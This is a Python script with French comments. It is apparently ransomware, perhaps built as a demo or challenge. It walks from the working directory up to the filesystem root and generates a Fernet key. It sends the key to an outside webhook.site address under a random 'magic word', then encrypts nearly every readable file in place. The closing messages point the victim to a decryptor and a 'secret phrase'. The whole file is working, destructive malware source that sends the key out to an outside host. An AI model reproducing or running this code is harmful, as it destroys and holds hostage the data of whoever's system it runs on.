import os
import requests
import random
import string
from cryptography.fernet import Fernet

# Supprimer l'ancienne clé s'il existe
if os.path.exists("thekey.key"):
    os.remove("thekey.key")

def get_all_files(directory, excluded_dirs):
    all_files = []
    for root, _, files in os.walk(directory):
        # Exclure les répertoires spécifiques
        if any(excluded_dir in root for excluded_dir in excluded_dirs):
            continue
        # Vérifier les permissions du répertoire
        if not os.access(root, os.R_OK):
            print(f"Permission refusée pour accéder au répertoire {root}")
            continue
        for file in files:
            filepath = os.path.join(root, file)
            try:
                # Tenter d'ouvrir le fichier pour vérifier les permissions
                if os.access(filepath, os.R_OK):
                    all_files.append(filepath)
                else:
                    print(f"Permission refusée pour accéder à {filepath}")
            except Exception as e:
                print(f"Erreur inattendue pour {filepath}: {e}")
    return all_files

# Définir les répertoires à exclure
excluded_dirs = ["/proc", "/sys", "/dev"]

# Remonter les répertoires et collecter les fichiers
files = []
current_dir = os.getcwd()
while True:
    files.extend(get_all_files(current_dir, excluded_dirs))
    parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
    if parent_dir == current_dir:  # Si on est à la racine du système de fichiers
        break
    current_dir = parent_dir

# Filtrer les fichiers à exclure
excluded_files = ["install.py", "thekey.key", "demal.py", "InstallRB.py", "requirements.txt", "README.md"]
files = [file for file in files if os.path.basename(file) not in excluded_files]

print(files)

key = Fernet.generate_key()

# Générer un mot magique aléatoire de 12 caractères avec des chiffres et des majuscules
magic_word = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

# Votre URL de RequestBin
requestbin_url = "https://webhook.site/68d426d1-ccff-4280-b9b5-dd46c0851bbd"

# Envoyer la clé à votre RequestBin avec le mot magique comme clé
response = requests.post(requestbin_url, data={magic_word: key})

# Vérifier le code de statut de la réponse
if response.status_code == 200:
    print("KEY SENT to RequestBin.")
else:
    print("Échec de l'envoi de la clé à RequestBin. Code de statut :", response.status_code)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    except PermissionError:
        print(f"Permission refusée pour chiffrer {file}")
    except Exception as e:
        print(f"Erreur lors du chiffrement de {file}: {e}")

print("FILES ENCRYPTED")
print("You should run demal.py to decrypt your files")
print("Good luck finding the secret phrase!")
